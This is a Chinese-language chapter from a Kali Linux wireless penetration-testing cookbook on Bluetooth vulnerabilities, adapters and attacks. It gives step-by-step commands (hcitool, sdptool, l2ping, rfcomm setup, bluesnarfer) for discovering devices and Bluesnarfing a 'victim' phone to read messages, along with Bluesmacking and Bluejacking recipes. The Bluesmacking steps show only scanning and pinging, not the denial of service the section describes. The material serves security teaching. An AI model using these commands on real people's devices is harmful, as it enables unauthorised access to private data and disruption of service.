+   窃听：由于蓝牙在其核心是一种网络技术，因此它容易受到窃听等攻击。虽然窃听蓝牙设备需要一些额外的技巧和知识，但它仍然是一种可以针对这些设备和技术部署的有效攻击。然而，诸如加密之类的技术的使用已经在所有版本的蓝牙中实施（尽管在最新版本中做得更好），已经解决了与信息泄露和修改相关的问题。但是，请记住，尽管使用了加密技术的旧版本蓝牙可能使用了该技术，但加密技术实际上比新版本的要差得多。因此，有必要将使用旧蓝牙规范的设备升级到解决了这些问题的技术的新版本。

+   拒绝服务：与无线接入点、网站和应用程序一样，蓝牙通信技术也容易受到拒绝服务攻击，如果被攻击者针对并希望压倒系统或干扰信号，这是可能的。在蓝牙平台上，这实际上是一个非常难以有效防范的攻击，但可以做的是关闭设备中的蓝牙功能，消除目标，从而阻止拒绝服务攻击。

+   硬件缺陷：虽然您可以对运行在您的蓝牙智能手机、平板电脑或计算机上的软件进行大量修补和更新，但您无法控制的是您可能从第三方购买的设备，比如耳机。在许多情况下，这些设备没有更简单明显的方法（如果有的话）来更新其中的固件，以修复这些设备可能存在的弱点和漏洞。正因为如此，这些设备本身可能成为恶意方的可行目标，希望给您带来麻烦或烦恼。在一些情况下，唯一的解决办法就是停止使用这个蓝牙配件，转而选择一个没有漏洞的配件。

+   默认值：这是一个棘手的问题，因为在许多情况下，对于公司来说，有一些弱默认设置的设备并没有立即的解决方案。所谓的弱默认值是指，一些可以使用蓝牙配对的设备具有消费者无法更改的 PIN 码。这些 PIN 码是在工厂设置的，并且在设备的整个生命周期内保持不变。这使得设备容易受到攻击，因为攻击者可以通过一些调查或观察迅速查看设备，知道其制造和型号，并通过简单的互联网搜索找到该设备的默认 PIN 码并进行配对。虽然随着时间的推移，这个问题正在变得不那么严重，但仍然有一些设备，无论是新的还是旧的，其默认 PIN 码都无法被消费者更改。在这些情况下，如果这是一个严重的漏洞，你可能别无选择，只能放弃使用该设备，选择一个允许更改的新设备。

虽然我们还可以将其他漏洞添加到这个列表中，但这只是为了向您展示这项技术存在一些漏洞。请记住，最初这项技术并不是以安全性为目标构建的；安全性是事后嵌入解决方案的。这项技术的初衷是促进不同平台和供应商之间距离较近的设备之间的通信，而在这方面它取得了相当大的成功。然而，安全目标实际上最多只是一个次要目标，因此随着蓝牙在全球范围内的普及和使用，它不得不在安全方面做一些追赶。

一些已经成为相当大目标并引起了安全技术市场的关注的事情是蓝牙漏洞，这些漏洞可能存在于亚马逊 Echo 和谷歌 Home 设备中。事实上，据报道，至少有八种不同的漏洞针对这两种设备系列。这些设备及其相关的漏洞之所以如此糟糕和危险，是因为它们几乎无法被当前的安全技术和解决方案检测到。另一点需要考虑的是，这两种设备系列目前估计在全球各地的家庭和其他地方部署了至少 2000 万个易受攻击的设备。

这些类型的攻击是已经被称为**blueborne**攻击的一种形式，如前所述。

# 选择蓝牙硬件

让我们在本节中真正看一下一些硬件、组件和其他可以用来有效改进和操作蓝牙技术的物品。当我们探索一些不同的蓝牙硬件时，您会发现，从概念上讲，它与我们在 Wi-Fi 技术中看到的很多东西是相同的，但并非所有都是相同的。然而，无论概念是与 Wi-Fi 中看到的相同还是不同，我们都将加以介绍，以确保您知道并了解哪些组件转移到了蓝牙，哪些没有。

首先，让我们注意到，现在大多数系统，无论是笔记本电脑、台式机还是平板电脑或智能手机等任何移动设备，基本上都在出厂时内置了蓝牙功能。事实上，诸如汽车、收音机、游戏系统、玩具和许多其他包括互联网设备的设备现在也倾向于内置蓝牙。因此，您很可能会遇到具有内置蓝牙功能的设备，因此您可能无需为了进行蓝牙探索而向您的设备添加任何特殊功能。然而，在股票设备上通常内置支持蓝牙的硬件通常不具备您执行各种攻击所需的所有功能。然而，在那些不支持股票蓝牙或需要增强此功能的设备上，我们需要担心可以用来使这项技术工作的特殊硬件或附件。

今天市场上的大多数设备都将支持蓝牙。它已成为现代设备消费者的预期功能。可以说，过去十年内发布的任何设备都将具备蓝牙功能作为其功能集的一部分。

向笔记本电脑等设备添加蓝牙的最常见方法之一是简单地购买所谓的蓝牙 Dongle。这个 Dongle 通常是 USB 插头，可以插入计算机上的可用 USB 插槽，然后允许该 Dongle 与蓝牙设备配对，无论是打印机、鼠标还是其他外围设备。这种类型的解决方案在老设备上非常常见，并且在所有者希望添加此功能时会被实施。以下屏幕截图显示了一个蓝牙 Dongle：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/e7c5de26-e78e-4db7-b289-bf85a03850ec.jpg)

蓝牙 Dongle

Dongles 对于为不具备蓝牙支持能力的设备添加蓝牙非常有用，但您可能会发现它们在我们将在本章中进行的测试类型方面存在限制。在本章的测试中，我们将不使用蓝牙 Dongles，因为在大多数情况下，它可能会限制我们打算执行的操作，尽管您可能希望尝试自行操作。

对我们在使用 USB 时重要的一个选择是增加 USB 适配器，它不仅仅是一个简单的转接器。这些专门的适配器增加了提高性能和数据传输速率的能力，甚至可以增加设备中可能存在的蓝牙范围。这对于技术爱好者或那些具有比其各自平台内置默认功能更高性能或不同数据传输要求的人来说并不罕见。与转接器基础解决方案一样，这些通常是以 USB 设备的形式出现。以下截图是一个蓝牙适配器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/a46c21f5-1810-4d64-b092-379b3ca724d0.png)

Dlink 蓝牙适配器

在本章中，我们正在做的事情中，一个重要的问题是增加蓝牙设备的范围。在大多数情况下，蓝牙范围可以用非常短的距离来衡量，相对而言。在大多数情况下，可以预期蓝牙可靠地传输的距离大约为 10 米或大约 30 英尺。一些设备可能会改变这种能力，并将这个范围扩展到更远的距离，但在大多数情况下，这仍然是一个很大的距离。如果像我们在本章中要做的那样进行渗透测试探索，这就会带来问题，因为当你必须在目标的半径范围内保持不被发现时，或者甚至更接近以获得可靠的信号时，这是非常困难的。理想情况下，我们希望有一种情况，可以从比大多数现货设备提供的范围更大的范围攻击和与目标互动。在这种情况下，我们可以获得专为工业应用设计的蓝牙适配器，在某些情况下可以达到几百英尺，甚至几千英尺的距离。这种类型的适配器通常是为工业或专业应用而设计的，必须作为 USB 设备在售后购买，并且可以插入任何空闲的 USB 端口，并且在操作系统的帮助下，可以通过特殊驱动程序进行完全交互。以下照片是一个工业蓝牙适配器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/738f5a4a-dedc-4fdf-a1a5-e9a013b88def.jpg)

Sena 蓝牙适配器

蓝牙使用的另一种硬件是可以非常有帮助的特殊天线，可以扩展这些适配器的范围。像之前提到的那种适用于工业应用的适配器，在很多情况下都有能力螺丝或螺栓固定天线，可以改变设备能够接收的范围。这意味着一个设备可能只能检测到几百英尺范围内的蓝牙信号，但可以将范围扩展到几千英尺。如果您需要这种范围，重要的是购买一个具有插入外部天线的适配器，并了解它所需的连接类型，因为特殊连接可能会有所不同。以下图片显示了一些蓝牙适配器和一些天线的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/7f11505c-6ba3-4c91-be41-7f8a856c439b.jpg)

带外部天线的适配器。

在谈论蓝牙功能和可能需要的选项时，值得讨论的最后一点是数据包注入。数据包注入是一种我们已经在 Wi-Fi 中看到的技术，特别是在之前的章节中进行 WEP 破解时。如果你还记得，我们使用数据包注入将 ARP 广播数据包放入网络并生成大量流量。内置在笔记本电脑、智能手机或平板电脑等设备中的蓝牙适配器几乎永远不会具备这种功能作为其原始功能的一部分。原因是大多数消费者不需要这种能力，而且这会增加设备的成本；因此，通常不会添加。因此，如果你决定以后进行任何需要进行数据包注入的攻击，几乎肯定会在几乎每种情况下选择外部适配器。

有了这些关于蓝牙硬件的细节，让我们继续看看我们可以使用蓝牙进行的一些攻击。

# 攻击类型

针对无线网络认证的攻击多种多样，每种攻击都有其自身的优势和劣势，使其在特定情况下有用或无用。

在我们开始探索每一种攻击之前，让我们首先列出本章将涵盖的攻击：

+   Bluesmacking

+   蓝牙劫持

+   Bluesnarfing

+   MAC 地址欺骗

+   中间人攻击

请记住，这些只是可以用来颠覆无线网络认证的攻击类型中的一小部分；它们绝不能被认为是唯一的攻击类型。

# Bluesmacking

我们将要介绍的第一种攻击类型被称为 Bluesmacking，是针对这种协议的较早的攻击类型之一。在我们对这种攻击的探索中，你会发现它是对网络、设备和应用程序的一种常见攻击的变种，被称为**拒绝服务**。

简而言之，当我们进行 Bluesmacking 攻击时，我们正在进行一种攻击，通过这种攻击，一个特制的数据包可以使设备无法使用。这种攻击通过传输一个数据包，该数据包超出了蓝牙设备可用的最大数据包大小。最终结果是设备无法处理该数据包，目标成为了拒绝服务的受害者。这种攻击是著名的攻击**死亡之 ping**的变种。

那么什么是 ping of death？ping of death 是一种经典的 DoS 攻击，由恶意方传输一个大于 IP 协议允许的 65,536 字节的 IP 数据包而生成。由于 IP 协议依赖于分段的使用，攻击者很快发现，如果他们将一个数据包分成片段，目标可以重新组装并超过这个 65,536 的限制。由于操作系统从未设计接收这么大的数据包，它们在接收到这个数据包后会冻结、崩溃或重新启动。

增加这种类型攻击的危险性的最后一点是，接收者的身份可能被欺骗。

作为对这种攻击的回应，产品供应商在 1997 年修补了他们的设备和软件，以减少这种攻击的可能性。然而，它仍然存在于蓝牙中。

这种 DoS 的影响可以采取多种形式，所有这些形式都会使目标设备在一段时间内无法使用。影响可能是设备被攻击者压倒，导致其无法被所有者操作并耗尽设备的电池，影响攻击后设备的持续运行。

# 准备工作

要开始进行操作，你需要准备以下物品：

+   一个蓝牙设备或外部适配器

+   Kali Linux

# 如何做...

为了进行 Bluesmack 攻击，我们将使用内置的 BlueZ 堆栈的一部分来实现。这可以是对蓝牙设备的一种非常有效的攻击，它可以有效地使受害者别无选择，只能关闭他们的设备、蓝牙，或者离开范围。

1.  首先，让我们在终端上使用`hciconfig`确认我们的蓝牙适配器是否已打开和被识别：

```
 hciconfig 
```

命令的结果看起来像以下的屏幕截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/258b3ccf-3161-417b-ac00-c684bf403980.png)

从这个屏幕截图中，您可以看到蓝牙适配器带有一个地址（就像物理网络适配器上的 MAC 地址一样）。它还有一个名字叫`hci0`。

1.  我们可能需要启动和启用蓝牙适配器，以确保它已准备好使用，通过发出以下命令：

```
 hciconfig hci0 up 
```

1.  现在我们将使用`hcitool`在区域内扫描蓝牙设备。我们首先使用该工具的扫描部分来寻找发送发现信标的蓝牙设备（处于发现模式）：

```
 hcitool scan 
```

1.  一旦命令列出了您希望进一步调查的设备，您可以使用`inq`命令来查询设备。您可以像这样使用该命令：

```
 kali > hcitool inq 
```

这将显示不同类型的信息，包括类信息，告诉我们正在扫描的设备类型。

1.  接下来，我们将使用**服务发现协议**（**SDP**）在设备上搜索服务。BlueZ 包括一个名为`sdptool`的工具，它能够浏览设备提供的服务。我们可以通过输入以下命令来使用它：

```
 sdptool browse <MAC Address> 
```

1.  有了附近设备的 MAC 地址，我们可以对它们进行 ping 操作，无论它们是否处于发现模式，以查看它们是否在范围内：

```
l2ping <MAC address> 
```

这表明具有 MAC 地址`76:6F:46:65:72:67`的设备在范围内并且可达。

# 蓝牙劫持

蓝牙劫持是另一种可以通过蓝牙对易受攻击的设备进行的攻击。然而，在进行蓝牙劫持之前，讨论它是如何工作的是很重要的。简而言之，蓝牙劫持是一种攻击，未经请求的消息通过蓝牙传输到蓝牙设备，如手机、PDA、笔记本电脑等，通过 OBEX 协议向另一个蓝牙设备发送一个通讯录，其中通常包含名称字段中的消息。请记住，蓝牙劫持者不会通过蓝牙劫持技术控制您的手机；攻击者只是通过蓝牙发送消息。将这种类型的攻击视为使用蓝牙协议进行垃圾邮件发送。

我在这里展示这种攻击，是为了完整地展示蓝牙设备中存在的漏洞。这种类型的攻击不需要 Kali 来成功执行。

# 准备就绪

要开始，您需要准备好以下物品：

+   蓝牙适配器

+   Kali Linux

# 如何做...

以下是执行此攻击的步骤：

1.  转到通讯录。创建一个新联系人。

1.  创建联系人时，将您希望通过蓝牙劫持的消息输入到联系人名称部分。

1.  选择通过蓝牙发送卡片。

1.  搜索范围内的蓝牙设备。

1.  选择找到的设备之一。

1.  点击发送。

# 蓝牙窃听

蓝牙窃听是一种可以针对易受攻击的设备进行的有趣且非常强大的攻击。简而言之，蓝牙窃听是通过蓝牙连接未经授权地访问设备，通常是手机、笔记本电脑和类似类型的设备之间的连接。这种攻击可以访问目标上各种类型的数据和资源，有些手机用户可以复制图片和私人视频。

这种类型的攻击针对任何已打开连接并且可以被扫描方发现的蓝牙设备。关闭蓝牙以及使设备不可发现是解决此问题的一种方法。

对于要被攻击的设备，攻击者必须通过暴力攻击猜测设备的 MAC 地址。与暴力攻击一样，猜测正确的 MAC 地址只是时间问题。

蓝牙使用 48 位唯一的 MAC 地址，其中前 24 位对制造商是共同的。剩下的 24 位有大约 1680 万种可能的组合，需要平均 840 万次尝试才能通过暴力破解猜出。

# 准备就绪

要开始操作，您需要准备以下物品：

+   一张能够进入监视模式的无线网卡

+   Kali Linux

这里列出的项目是基本要求，如果需要，您可以轻松地使用更多（或不同）的组件。例如，如果您想要增强范围，可以使用一个带有外部天线连接的基于 USB 的无线网卡，以获得更好的接收效果。

# 如何做...

1.  现在 Bluesnarfer 已安装，配置`rfcomm`：

```
 mkdir -p /dev/bluetooth/rfcomm
 mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0
 mknod --mode=666 /dev/rfcomm0 c 216 0
 hciconfig -i hci0 up
 hciconfig hci0
```

1.  现在开始扫描潜在的漏洞：

```
 hcitool scan hci0 
```

1.  Ping 受害者，看看他在不在：

```
 l2ping  < victim mac addr> 
```

1.  浏览受害者的`rfcomm`频道进行连接：

```
 sdptool browse --tree --l2cap < mac addr > 
```

1.  现在 Bluesnarfer 已经设置好了。现在，您可以访问受害者的手机，查看短信，打电话等等。

```
 Bluesnarfer -r 1-100 -C 7 -b < mac addr > 
```
